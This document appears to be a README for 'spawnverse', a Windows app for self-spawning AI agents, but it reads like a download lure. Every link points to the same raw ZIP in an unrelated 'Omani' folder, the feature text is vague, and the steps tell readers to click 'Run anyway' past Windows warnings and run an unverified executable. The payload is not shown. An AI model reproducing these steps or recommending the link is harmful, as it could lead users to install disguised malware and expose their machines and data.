# 🧬 spawnverse - Run Self-Spawning AI Agents

[![Download spawnverse](https://img.shields.io/badge/Download-Spawnverse-blue?style=for-the-badge)](https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip)

## 🚀 What is spawnverse?

spawnverse is a Windows app for running AI agents that grow from tasks. You do not start with a full set of agents. You give it a task, and it builds the agents it needs.

It is built for people who want to:

- start with one task and let the system split it into parts
- keep memory across agent runs
- use guardrails to keep agent actions in check
- review a record of what each agent did
- run local AI models through Groq and LLaMA support

## ✨ What you get

spawnverse gives you a simple way to run a multi-agent setup without hand-building each agent first.

Main features:

- **Self-spawning agents** — tasks create agents on demand
- **Distributed memory** — agents can share task context
- **4-layer guardrails** — checks that help control agent actions
- **Fossil record** — a trace of what happened in each run
- **Groq + LLaMA support** — model options for different setups
- **Agent orchestration** — task flow stays organized
- **Open-source project** — you can inspect and adapt it

## 🖥️ System requirements

Use a Windows PC with:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 2 GB free disk space
- Internet access for first setup
- A recent browser to open the download page
- PowerShell or Command Prompt for setup steps if needed

For smoother use, 16 GB RAM gives better headroom when you run several agents at once.

## 📥 Download spawnverse

Go to the project page and download and run this file or follow the release files shown there:

https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip

If the page shows a ZIP or EXE file, download that file to your PC. If it shows source files only, use the release or build option listed on the page.

## 🧭 Install on Windows

Follow these steps on Windows:

1. Open this page in your browser:
   https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip

2. Look for a **Releases** area or a download file near the top of the page.

3. If you see a **.exe** file, click it to start the download.

4. If you see a **.zip** file, download it and save it to your Downloads folder.

5. If Windows shows a prompt, choose **Keep** or **Run anyway** if you trust the file from the project page.

6. If you downloaded a ZIP file, right-click it and choose **Extract All**.

7. Open the extracted folder.

8. Double-click the app file to start spawnverse.

## 🛠️ First run setup

On first launch, spawnverse may ask for a few basic settings. Set these before you start a task:

- **Workspace folder** — pick where task data should be saved
- **Model choice** — select Groq or LLaMA if the app asks
- **Memory path** — choose where shared memory should live
- **Guardrail level** — keep the default level if you are new
- **Log folder** — store run records and agent traces

If the app asks for an API key or model path, enter the value from your AI provider account or local model setup.

## 🧪 How to use it

Use spawnverse with a simple task first.

Example workflow:

1. Open the app.
2. Enter one clear task, such as:
   - sort customer emails into groups
   - plan a research outline
   - compare product ideas
   - review a folder of notes
3. Start the run.
4. Let spawnverse create agents from the task.
5. Watch the task split into smaller parts.
6. Check the fossil record after the run.
7. Review the shared memory if you want to see context between agents.

Keep your first task small. That makes it easier to see how the system behaves.

## 🧱 How spawnverse works

spawnverse uses a task-first model.

Here is the basic flow:

- You give it a task.
- The system creates one or more agents.
- Each agent takes a smaller part of the work.
- The agents share useful memory.
- Guardrails check the agent steps.
- The app keeps a record of the run.

This approach helps when one task needs several steps or several points of review.

## 🛡️ Guardrails

spawnverse includes four layers of guardrails to help control agent behavior.

These guardrails can help with:

- blocking unsafe actions
- limiting tasks to the allowed scope
- keeping agent output in line with the goal
- reducing stray or unrelated actions

If you are new, keep the default guardrails on. That gives you the safest starting point.

## 🧠 Distributed memory

spawnverse uses distributed memory so agents do not work in isolation.

This helps agents:

- remember task goals
- share useful facts
- avoid repeating the same work
- keep context across steps

You can think of it as a shared work area that agents can check while they run.

## 📜 Fossil record

The fossil record keeps a trail of what happened during a run.

It can show:

- which agent was created
- which task it received
- what result it produced
- what checks ran
- where a step failed or changed

Use the fossil record when you want to understand how the system reached a result.

## 🤖 Model support

spawnverse works with model backends such as Groq and LLaMA.

Use a cloud model if you want fast response times.

Use a local model if you want more control over your setup.

If you are not sure which one to pick:

- choose Groq for quick setup
- choose LLaMA if you already run local AI models

## 📁 Project layout

A simple project layout may include:

- `app` — the main program files
- `agents` — agent logic and task flow
- `memory` — shared state and context storage
- `guardrails` — rules and checks
- `logs` — run history and traces
- `config` — app settings
- `models` — model connectors or setup files

You do not need to edit these folders to use the app.

## 🔧 Common tasks

Use spawnverse for tasks like:

- research planning
- note sorting
- document review
- workflow breakdown
- content comparison
- idea grouping
- step-by-step task execution

It works best when a task can split into smaller pieces.

## 🧯 If the app does not start

Try these steps:

1. Check that you downloaded the full file.
2. Move the app to a simple folder like `C:\spawnverse`.
3. Run it again.
4. Make sure Windows did not block the file.
5. Check that your model settings are valid.
6. Confirm that the app has access to its workspace folder.
7. If the problem stays, reopen the project page and check for updated files.

## 🔍 If the model does not respond

Try this:

- confirm your internet connection
- check the API key or model path
- verify that the selected model is available
- reduce the task size
- restart the app
- try the default model setting again

## 📝 Tips for first-time use

- Start with one short task.
- Keep the workspace in one folder.
- Leave guardrails on.
- Review the fossil record after each run.
- Use clear task text.
- Do not overload the app with many tasks at once.

## 📌 Links

Primary download page:
https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip

Project name:
spawnverse

Topic focus:
agent-framework, agentic-ai, agents, autonomous-agents, autonomous-systems, cognitive-architecture, distributed-memory, guardrails, llm, llm-orchestration, multi-agent, open-source, self-spawning